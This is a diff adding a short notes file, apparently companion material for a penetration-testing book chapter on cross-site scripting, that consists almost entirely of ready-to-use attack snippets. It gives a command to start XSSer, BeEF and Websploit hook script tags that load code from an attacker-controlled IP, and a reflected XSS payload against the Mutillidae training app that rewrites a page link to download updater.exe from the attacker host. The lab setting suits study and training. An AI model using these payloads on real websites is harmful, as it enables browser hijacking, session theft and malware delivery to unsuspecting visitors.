@@ -1,0 +1,21 @@
+Chapter 6: Infiltrating Sessions via Cross-Site Scripting
+
+Start XSSer:
+
+xsser –gtk
+
+
+BeEF Hook Script for XSS:
+
+<script src="http://172.16.30.128:3000/hook.js"></script>
+
+
+XSS for malicious payload delivery:
+
+http://172.16.30.129/mutillidae/index.php?page=user-info.php&username= <script>window.onload = function() {var AllLinks=document.getElementsByTagName("a");  AllLinks[0].href = "http://172.16.30.128/updater.exe"; }</script>
+
+
+Websploit hook: 
+
+<script src=http://172.16.30.128:8000></script>
+
